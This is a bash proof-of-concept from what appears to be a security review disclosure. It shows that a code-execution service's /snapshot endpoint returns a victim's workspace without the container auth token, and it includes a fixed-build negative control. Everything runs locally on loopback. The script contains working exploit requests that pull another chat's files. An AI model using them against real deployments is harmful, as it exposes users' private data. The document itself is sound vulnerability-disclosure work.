#!/usr/bin/env bash
# Finding 3 PoC: code-execution-environment /snapshot ignores the per-chat container token.
# Local only. Runs as an unprivileged uid (65534). No network traffic leaves loopback.
#
#   api-server, executor : code-execution-environment @ 8676c64 (pristine clone), built like the
#                          Dockerfiles. ONLY the filesystem path constants (/workspace,
#                          /user-uploads, /run/execsock/exec.sock) are rewritten so the binaries
#                          run outside a container without root. No logic is changed.
#   shim                 : github.com/tinfoilsh/tfshim v0.3.18 (the shim-version pinned in
#                          tinfoil-config.yml), from the Go module cache, unmodified. Its config is
#                          the `shim:` block of the pristine tinfoil-config.yml, verbatim, plus
#                          local-only knobs (port, self-signed TLS, key/cache paths).
#
# Usage: ./run.sh            (vulnerable build, then negative control with fix.patch)
set -euo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
SRC=${CEE_SRC:-/root/tinfoil-review/repos/code-execution-environment}
COMMIT=8676c64cbfc1a8c09e64f5afeda52a78484534cb
WORK=${WORK:-/root/tinfoil-review/work/disclosures/03}
source /root/tinfoil-review/env.sh
export GOFLAGS=-mod=readonly CGO_ENABLED=0
TFSHIM_MOD=$GOMODCACHE/github.com/tinfoilsh/tfshim@v0.3.18
RUNAS=(setpriv --reuid=65534 --regid=65534 --clear-groups --inh-caps=-all)
SHIM_PORT=18443
S=https://localhost:$SHIM_PORT
AUTH=X-Code-Execution-Container-Auth-Token
H='Content-Type: application/json'

# ---------------------------------------------------------------- build
rm -rf "$WORK/src" && mkdir -p "$WORK/bin"
git -C "$SRC" archive --prefix=src/ "$COMMIT" | tar -x -C "$WORK"
RT=$(mktemp -d /tmp/cee-poc.XXXXXX); chmod 755 "$RT"   # runtime root (uid 65534 cannot enter /root)
sed -i "s#\"/workspace\"#\"$RT/workspace\"#; s#\"/run/execsock/exec.sock\"#\"$RT/run/execsock/exec.sock\"#" "$WORK/src/executor/main.go"
sed -i "s#\"/user-uploads\"#\"$RT/user-uploads\"#" "$WORK/src/executor/uploads.go"
sed -i "s#\"/run/execsock/exec.sock\"#\"$RT/run/execsock/exec.sock\"#" "$WORK/src/api-server/main.go"
echo "=== path-constant patch (the only change to the shipped code):"
git diff --no-index -U0 "$SRC/executor/main.go" "$WORK/src/executor/main.go" | grep '^[-+][^-+]' || true
git diff --no-index -U0 "$SRC/executor/uploads.go" "$WORK/src/executor/uploads.go" | grep '^[-+][^-+]' || true
git diff --no-index -U0 "$SRC/api-server/main.go" "$WORK/src/api-server/main.go" | grep '^[-+][^-+]' || true
(cd "$WORK/src/executor"   && go build -trimpath -o "$WORK/bin/executor" .)
(cd "$WORK/src/api-server" && go build -trimpath -o "$WORK/bin/api-server" .)
cp -r "$WORK/src/api-server" "$WORK/src/api-server-fixed"
git -C "$WORK/src/api-server-fixed" apply -p2 "$HERE/fix.patch"
(cd "$WORK/src/api-server-fixed" && go build -trimpath -o "$WORK/bin/api-server-fixed" .)
[ -x "$WORK/bin/tfshim" ] || (cd "$TFSHIM_MOD" && CGO_ENABLED=1 go build -trimpath -o "$WORK/bin/tfshim" .)
cp "$WORK/bin/"* "$RT/"

# ---------------------------------------------------------------- shim config
mkdir -p "$RT/shim"
{ echo "# local-only knobs (not in tinfoil-config.yml)"
  echo "listen-port: $SHIM_PORT"; echo "tls-mode: self-signed"
  echo "hpke-key-file: $RT/shim/hpke_key.json"; echo "cache-dir: $RT/shim/cache"
  echo "# verbatim shim: block of tinfoil-config.yml @ ${COMMIT:0:7}"
  git -C "$SRC" show "$COMMIT:tinfoil-config.yml" | sed -n '/^shim:/,$p' | tail -n +2 | sed 's/^  //'
} > "$RT/shim/shim.yml"
printf 'env:\n  DOMAIN: localhost\n' > "$RT/shim/external.yml"
echo; echo "=== shim config:"; cat "$RT/shim/shim.yml"

PIDS=()
cleanup() { kill "${PIDS[@]}" 2>/dev/null || true; wait 2>/dev/null || true; }
trap 'cleanup; rm -rf "$RT"' EXIT

start() { # $1 = api-server binary name
  cleanup; PIDS=()
  rm -rf "$RT/workspace" "$RT/user-uploads" "$RT/run"
  mkdir -p "$RT/workspace" "$RT/user-uploads" "$RT/run/execsock"
  chown -R 65534:65534 "$RT/workspace" "$RT/user-uploads" "$RT/run" "$RT/shim"
  "${RUNAS[@]}" "$RT/executor" > "$RT/executor.log" 2>&1 & PIDS+=($!)
  for _ in $(seq 50); do [ -S "$RT/run/execsock/exec.sock" ] && break; sleep 0.1; done
  "${RUNAS[@]}" "$RT/$1" > "$RT/api-server.log" 2>&1 & PIDS+=($!)
  "${RUNAS[@]}" "$RT/tfshim" -c "$RT/shim/shim.yml" -e "$RT/shim/external.yml" > "$RT/shim.log" 2>&1 & PIDS+=($!)
  for _ in $(seq 100); do [ "$(curl -sk -o /dev/null -w '%{http_code}' $S/health)" = 200 ] && break; sleep 0.2; done
  echo "processes: $(ps -o user=,comm= -p "$(IFS=,; echo "${PIDS[*]}")" | tr -s ' ' | tr '\n' ';')"
}
post() { # $1 label, $2 path, $3 token ('' = none), $4 body
  local a=(-sk -X POST "$S$2" -H "$H" -o "$RT/resp" -w '%{http_code}')
  [ -n "$3" ] && a+=(-H "$AUTH: $3")
  [ -n "${4:-}" ] && a+=(--data-binary "$4")
  local code; code=$(curl "${a[@]}")
  printf '%-44s HTTP %s  %s\n' "$1" "$code" "$(head -c 90 "$RT/resp")"
}
untar() { sed 's/^{"tar":"//; s/"}$//' "$RT/resp" | base64 -d > "$RT/stolen.tar"
  tar -tvf "$RT/stolen.tar" | awk '{print "    tar entry:", $6, "(" $3 " bytes)"}'
  echo "    contents of notes/secret.txt: $(tar -xOf "$RT/stolen.tar" notes/secret.txt)"; }

TOKEN=$(head -c 32 /dev/urandom | od -An -tx1 | tr -d ' \n')  # stands in for HKDF(chatKEK, ...)
SECRET="CANARY-$(head -c 6 /dev/urandom | od -An -tx1 | tr -d ' \n') patient=Jane Doe dx=confidential"
WRITE="{\"path\":\"notes/secret.txt\",\"contents\":\"$(printf '%s\n' "$SECRET" | base64 -w0)\"}"

for MODE in vulnerable fixed; do
  BIN=api-server; [ $MODE = fixed ] && BIN=api-server-fixed
  echo; echo "################ $MODE build ($BIN, shipped executor, tfshim v0.3.18)"
  start $BIN
  post "[victim]   /write notes/secret.txt (token)"   /write "$TOKEN" "$WRITE"
  post "[attacker] /read  (no token)"                 /read  ""      '{"path":"notes/secret.txt"}'
  post "[attacker] /read  (wrong token)"              /read  "$(printf 'a%.0s' {1..64})" '{"path":"notes/secret.txt"}'
  post "[attacker] /snapshot (no token, no body)"     /snapshot ""
  if grep -q '"tar"' "$RT/resp"; then untar; RESULT_A=$(grep -c "$SECRET" <(tar -xOf "$RT/stolen.tar" notes/secret.txt) || true); else RESULT_A=0; fi
  if [ $MODE = vulnerable ]; then
    [ "$RESULT_A" = 1 ] && echo "RESULT vulnerable: attacker without token obtained the victim's workspace (canary matched)" \
                        || { echo "RESULT vulnerable: NOT reproduced"; exit 1; }
  else
    post "[orchestrator] /snapshot (victim token)"     /snapshot "$TOKEN"
    [ "$RESULT_A" = 0 ] && echo "RESULT fixed: /snapshot without token refused; token holder still snapshots" \
                        || { echo "RESULT fixed: control FAILED"; exit 1; }
  fi
done
